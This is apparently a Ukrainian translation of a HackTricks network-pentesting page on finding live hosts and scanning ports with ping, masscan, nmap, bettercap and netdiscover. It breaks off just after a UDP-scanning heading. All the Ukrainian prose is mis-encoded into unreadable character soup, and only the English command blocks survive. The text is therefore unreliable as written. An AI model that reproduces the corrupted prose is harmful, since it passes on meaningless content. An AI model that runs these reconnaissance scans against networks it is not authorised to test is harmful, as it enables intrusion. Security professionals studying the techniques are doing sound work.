# –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è –≤ –º–µ—Ä–µ–∂—É

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**–ü—ñ–¥–∫–∞–∑–∫–∞ —â–æ–¥–æ –±–∞–≥—ñ–≤**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—è** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—ñ–π **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –ø–æ—à—É–∫—É –±–∞–≥—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## –í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑–∑–æ–≤–Ω—ñ

–¶–µ –±—É–¥–µ **–∫–æ—Ä–æ—Ç–∫–∏–π —Ä–æ–∑–¥—ñ–ª** –ø—Ä–æ —Ç–µ, —è–∫ –∑–Ω–∞–π—Ç–∏ **IP-–∞–¥—Ä–µ—Å–∏, —è–∫—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å** –∑ **–Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É**.\
–£ —Ü—ñ–π —Å–∏—Ç—É–∞—Ü—ñ—ó —É –≤–∞—Å —î –¥–µ—è–∫–∏–π **–¥—ñ–∞–ø–∞–∑–æ–Ω IP-–∞–¥—Ä–µ—Å** (–º–æ–∂–ª–∏–≤–æ, –Ω–∞–≤—ñ—Ç—å –∫—ñ–ª—å–∫–∞ **–¥—ñ–∞–ø–∞–∑–æ–Ω—ñ–≤**), —ñ –≤–∞–º –ø—Ä–æ—Å—Ç–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ **—è–∫—ñ IP-–∞–¥—Ä–µ—Å–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å**.

### ICMP

–¶–µ **–Ω–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π** —ñ **–Ω–∞–π—à–≤–∏–¥—à–∏–π** —Å–ø–æ—Å—ñ–± –≤–∏—è–≤–∏—Ç–∏, —á–∏ –ø—Ä–∞—Ü—é—î —Ö–æ—Å—Ç —á–∏ –Ω—ñ.\
–í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –¥–µ—è–∫—ñ **–ø–∞–∫–µ—Ç–∏ ICMP** —ñ **–æ—á—ñ–∫—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**. –ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± - –ø—Ä–æ—Å—Ç–æ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ **–∑–∞–ø–∏—Ç –Ω–∞ –µ—Ö–æ** —ñ –æ—á—ñ–∫—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Å—Ç–æ—ó –∫–æ–º–∞–Ω–¥–∏ `ping` –∞–±–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `fping` –¥–ª—è **–¥—ñ–∞–ø–∞–∑–æ–Ω—ñ–≤**.\
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **nmap** –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö —Ç–∏–ø—ñ–≤ –ø–∞–∫–µ—Ç—ñ–≤ ICMP (—Ü–µ —É–Ω–∏–∫–Ω–µ —Ñ—ñ–ª—å—Ç—Ä—ñ–≤ –¥–ª—è –∑–≤–∏—á–∞–π–Ω–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤-–≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π –Ω–∞ –µ—Ö–æ ICMP).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### –í–∏—è–≤–ª–µ–Ω–Ω—è TCP-–ø–æ—Ä—Ç—ñ–≤

–î—É–∂–µ –ø–æ—à–∏—Ä–µ–Ω–æ—é —î —Å–∏—Ç—É–∞—Ü—ñ—è, –∫–æ–ª–∏ –≤—Å—ñ –≤–∏–¥–∏ –ø–∞–∫–µ—Ç—ñ–≤ ICMP —Ñ—ñ–ª—å—Ç—Ä—É—é—Ç—å—Å—è. –¢–æ–¥—ñ –≤—Å–µ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø—Ä–∞—Ü—é—î —Ö–æ—Å—Ç, - —Ü–µ **—Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–Ω–∞–π—Ç–∏ –≤—ñ–¥–∫—Ä–∏—Ç—ñ –ø–æ—Ä—Ç–∏**. –ö–æ–∂–µ–Ω —Ö–æ—Å—Ç –º–∞—î **65535 –ø–æ—Ä—Ç—ñ–≤**, —Ç–æ–º—É, —è–∫—â–æ —É –≤–∞—Å —î "–≤–µ–ª–∏–∫–∏–π" –æ–±—Å—è–≥, –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ** –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π **–∫–æ–∂–µ–Ω –ø–æ—Ä—Ç** –∫–æ–∂–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞, —Ü–µ –∑–∞–π–º–µ –∑–∞–Ω–∞–¥—Ç–æ –±–∞–≥–∞—Ç–æ —á–∞—Å—É.\
–û—Ç–∂–µ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–µ–Ω **—à–≤–∏–¥–∫–∏–π —Å–∫–∞–Ω–µ—Ä –ø–æ—Ä—Ç—ñ–≤** ([masscan](https://github.com/robertdavidgraham/masscan)) —Ç–∞ —Å–ø–∏—Å–æ–∫ **–Ω–∞–π–±—ñ–ª—å—à –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–Ω–∏—Ö –ø–æ—Ä—Ç—ñ–≤:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ü–µ–π –∫—Ä–æ–∫ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `nmap`, –∞–ª–µ —Ü–µ –ø–æ–≤—ñ–ª—å–Ω—ñ—à–µ —ñ –¥–µ—è–∫—ñ –ø—Ä–æ–±–ª–µ–º–∏ –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—î—é —Ö–æ—Å—Ç—ñ–≤ `nmap`. 

### –í–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ—Ä—Ç—É HTTP

–¶–µ –ø—Ä–æ—Å—Ç–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è TCP-–ø–æ—Ä—Ç—É, –∫–æ—Ä–∏—Å–Ω–µ, –∫–æ–ª–∏ –≤–∏ —Ö–æ—á–µ—Ç–µ **–∑–æ—Å–µ—Ä–µ–¥–∏—Ç–∏—Å—è –Ω–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—ñ HTTP-—Å–µ—Ä–≤—ñ—Å—ñ–≤**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### –í–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ UDP

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ —î **–≤—ñ–¥–∫—Ä–∏—Ç—ñ UDP –ø–æ—Ä—Ç–∏**, —â–æ–± –≤–∏—Ä—ñ—à–∏—Ç–∏, —á–∏ –≤–∞—Ä—Ç–æ **–ø—Ä–∏–¥—ñ–ª–∏—Ç–∏ –±—ñ–ª—å—à–µ —É–≤–∞–≥–∏** **—Ö–æ—Å—Ç—É**. –û—Å–∫—ñ–ª—å–∫–∏ UDP-—Å–µ—Ä–≤—ñ—Å–∏ –∑–∞–∑–≤–∏—á–∞–π **–Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å** **–∂–æ–¥–Ω–∏–º–∏ –¥–∞–Ω–∏–º–∏** –Ω–∞ –∑–≤–∏—á–∞–π–Ω–∏–π –ø–æ—Ä–æ–∂–Ω—ñ–π –ø–∞–∫–µ—Ç –∑–∞–ø–∏—Ç—É UDP, –≤–∞–∂–∫–æ —Å–∫–∞–∑–∞—Ç–∏, —á–∏ –ø–æ—Ä—Ç —Ñ—ñ–ª—å—Ç—Ä—É—î—Ç—å—Å—è —á–∏ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π. –ù–∞–π–ø—Ä–æ—Å—Ç—ñ—à–∏–π —Å–ø–æ—Å—ñ–± –≤–∏—Ä—ñ—à–∏—Ç–∏ —Ü–µ - –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–∞–∫–µ—Ç, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ —Ä–æ–±–æ—á–∏–º —Å–µ—Ä–≤—ñ—Å–æ–º, —ñ –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —è–∫–∏–π —Å–µ—Ä–≤—ñ—Å –ø—Ä–∞—Ü—é—î, –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –Ω–∞–π–±—ñ–ª—å—à –π–º–æ–≤—ñ—Ä–Ω–∏–π –Ω–∞ –ø—ñ–¥—Å—Ç–∞–≤—ñ –Ω–æ–º–µ—Ä–∞ –ø–æ—Ä—Ç—É:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
–†—è–¥–æ–∫ nmap, –∑–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–π —Ä–∞–Ω—ñ—à–µ, –ø—Ä–æ—Ç–µ—Å—Ç—É—î **–ø–µ—Ä—à—ñ 1000 –ø–æ—Ä—Ç—ñ–≤ UDP** –≤ –∫–æ–∂–Ω–æ–º—É —Ö–æ—Å—Ç—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥—ñ–∞–ø–∞–∑–æ–Ω—É **/24**, –∞–ª–µ –Ω–∞–≤—ñ—Ç—å —Ü–µ –∑–∞–π–º–µ **>20 —Ö–≤**. –Ø–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω—ñ **–Ω–∞–π—à–≤–∏–¥—à—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` –¶–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç—å —Ü—ñ **UDP –∑–∞–ø–∏—Ç–∏** –Ω–∞ —ó—Ö **–æ—á—ñ–∫—É–≤–∞–Ω–∏–π –ø–æ—Ä—Ç** (–¥–ª—è –¥—ñ–∞–ø–∞–∑–æ–Ω—É /24 —Ü–µ –∑–∞–π–º–µ –≤—Å—å–æ–≥–æ 1 —Ö–≤): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### –í—ñ–¥–∫—Ä–∏—Ç—Ç—è –ø–æ—Ä—Ç—ñ–≤ SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–µ–Ω–Ω—è Wifi

–¢—É—Ç –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —á—É–¥–æ–≤–∏–π –ø–æ—Å—ñ–±–Ω–∏–∫ –∑ —É—Å—ñ–º–∞ –≤—ñ–¥–æ–º–∏–º–∏ –∞—Ç–∞–∫–∞–º–∏ –Ω–∞ Wifi –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## –í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑—Å–µ—Ä–µ–¥–∏–Ω–∏

–Ø–∫—â–æ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–µ—Ä–µ–∂—ñ, –æ–¥–Ω—ñ—î—é –∑ –ø–µ—Ä—à–∏—Ö —Ä–µ—á–µ–π, —è–∫—ñ –≤–∏ –∑–∞—Ö–æ—á–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏, –±—É–¥–µ **–≤–∏—è–≤–ª–µ–Ω–Ω—è —ñ–Ω—à–∏—Ö —Ö–æ—Å—Ç—ñ–≤**. –ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ **—Ç–æ–≥–æ, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ –±–∞–≥–∞—Ç–æ —à—É–º—É** –≤–∏ –º–æ–∂–µ—Ç–µ/—Ö–æ—á–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏, –º–æ–∂—É—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è —Ä—ñ–∑–Ω—ñ –¥—ñ—ó:

### –ü–∞—Å–∏–≤–Ω–∏–π

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –ø–∞—Å–∏–≤–Ω–æ–≥–æ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø—ñ–¥–∫–ª—é—á–µ–Ω–æ—ó –º–µ—Ä–µ–∂—ñ:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### –ê–∫—Ç–∏–≤–Ω–∏–π

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–µ—Ö–Ω—ñ–∫–∏, —è–∫—ñ –∫–æ–º–µ–Ω—Ç—É—é—Ç—å—Å—è –≤ [_**–í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑–∑–æ–≤–Ω—ñ**_](./#discovering-hosts-from-the-outside) (_–í–∏—è–≤–ª–µ–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤ TCP/HTTP/UDP/SCTP_), —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ —Ç—É—Ç**.\
–ê–ª–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ **–æ–¥–Ω—ñ–π –º–µ—Ä–µ–∂—ñ** –∑ —ñ–Ω—à–∏–º–∏ —Ö–æ—Å—Ç–∞–º–∏, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–±–∏—Ç–∏ **–±—ñ–ª—å—à–µ —Ä–µ—á–µ–π**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### –ê–∫—Ç–∏–≤–Ω–∏–π ICMP

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–µ—Ö–Ω—ñ–∫–∏, —è–∫—ñ –∫–æ–º–µ–Ω—Ç—É—é—Ç—å—Å—è –≤ _–í–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤ –∑–∑–æ–≤–Ω—ñ_ ([_**ICMP**_](./#icmp)), –º–æ–∂—É—Ç—å –±—É—Ç–∏ —Ç–∞–∫–æ–∂ **–∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ —Ç—É—Ç**.\
–ê–ª–µ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –∑–Ω–∞—Ö–æ–¥–∏—Ç–µ—Å—å –≤ **—Ç—ñ–π —Å–∞–º—ñ–π –º–µ—Ä–µ–∂—ñ** —â–æ —ñ —ñ–Ω—à—ñ —Ö–æ—Å—Ç–∏, –≤–∏ –º–æ–∂–µ—Ç–µ —Ä–æ–±–∏—Ç–∏ **–±—ñ–ª—å—à–µ —Ä–µ—á–µ–π**:

- –Ø–∫—â–æ –≤–∏ **–ø—ñ–Ω–≥—É—î—Ç–µ** **–∞–¥—Ä–µ—Å—É –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –ø—ñ–¥—Å–µ–≥–º–µ–Ω—Ç—É**, –ø—ñ–Ω–≥ –ø–æ–≤–∏–Ω–µ–Ω –¥—ñ–π—Ç–∏ –¥–æ **–∫–æ–∂–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞**, —ñ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å **–≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏** –≤–∞–º: `ping -b 10.10.5.255`
- –ü—ñ–Ω–≥—É—é—á–∏ **–∞–¥—Ä–µ—Å—É –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –º–æ–≤–ª–µ–Ω–Ω—è**, –≤–∏ –Ω–∞–≤—ñ—Ç—å –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ö–æ—Å—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **—ñ–Ω—à–∏—Ö –ø—ñ–¥–º–µ—Ä–µ–∂**: `ping -b 255.255.255.255`
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –ø—Ä–∞–ø–æ—Ä—Ü—ñ `-PE`, `-PP`, `-PM` —É `nmap` –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –∑–∞–ø–∏—Ç–∏ **ICMPv4 echo**, **–≤—ñ–¥–º—ñ—Ç–∫–∏ —á–∞—Å—É** —Ç–∞ **–º–∞—Å–∫–∏ –ø—ñ–¥–º–µ—Ä–µ–∂—ñ**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **–ü—Ä–æ–∫–∏–¥–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É (Wake On Lan)**

–ü—Ä–æ–∫–∏–¥–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –º–µ—Ä–µ–∂—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **—É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è** –∫–æ–º–ø'—é—Ç–µ—Ä—ñ–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **–º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è**. –ú–∞–≥—ñ—á–Ω–∏–π –ø–∞–∫–µ—Ç, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è –∫–æ–º–ø'—é—Ç–µ—Ä–∞, —Ü–µ –ª–∏—à–µ –ø–∞–∫–µ—Ç, –≤ —è–∫–æ–º—É –Ω–∞–¥–∞—î—Ç—å—Å—è **MAC Dst**, —ñ –ø–æ—Ç—ñ–º –≤—ñ–Ω **–ø–æ–≤—Ç–æ—Ä—é—î—Ç—å—Å—è 16 —Ä–∞–∑—ñ–≤** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–æ–≥–æ –∂ –ø–∞–∫–µ—Ç—É.\
–ü–æ—Ç—ñ–º —Ç–∞–∫—ñ –ø–∞–∫–µ—Ç–∏ –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –≤ **Ethernet 0x0842** –∞–±–æ –≤ **UDP –ø–∞–∫–µ—Ç –Ω–∞ –ø–æ—Ä—Ç 9**.\
–Ø–∫—â–æ **–Ω–µ –≤–∫–∞–∑–∞–Ω–æ \[MAC]**, –ø–∞–∫–µ—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ **—à–∏—Ä–æ–∫–æ–º–æ–≤–Ω—É Ethernet –º–µ—Ä–µ–∂—É** (—ñ —à–∏—Ä–æ–∫–æ–º–æ–≤–Ω–∏–π MAC –±—É–¥–µ —Ç–∏–º, —â–æ –ø–æ–≤—Ç–æ—Ä—é—î—Ç—å—Å—è).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è —Ö–æ—Å—Ç—ñ–≤

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –≤–∏ –≤–∏—è–≤–∏–ª–∏ –≤—Å—ñ IP-–∞–¥—Ä–µ—Å–∏ (–∑–æ–≤–Ω—ñ—à–Ω—ñ –∞–±–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ), —è–∫—ñ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥–µ—Ç–∞–ª—å–Ω–æ –ø—Ä–æ—Å–∫–∞–Ω—É–≤–∞—Ç–∏, –º–æ–∂–Ω–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ –¥—ñ—ó.

### TCP

* **–í—ñ–¥–∫—Ä–∏—Ç–∏–π** –ø–æ—Ä—Ç: _SYN --> SYN/ACK --> RST_
* **–ó–∞–∫—Ä–∏—Ç–∏–π** –ø–æ—Ä—Ç: _SYN --> RST/ACK_
* **–§—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏–π** –ø–æ—Ä—Ç: _SYN --> \[–ù–ï–ú–ê–Ñ –í–Ü–î–ü–û–í–Ü–î–Ü]_
* **–§—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω–∏–π** –ø–æ—Ä—Ç: _SYN --> –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

–Ñ 2 –≤–∞—Ä—ñ–∞–Ω—Ç–∏ –¥–ª—è —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è UDP-–ø–æ—Ä—Ç—É:

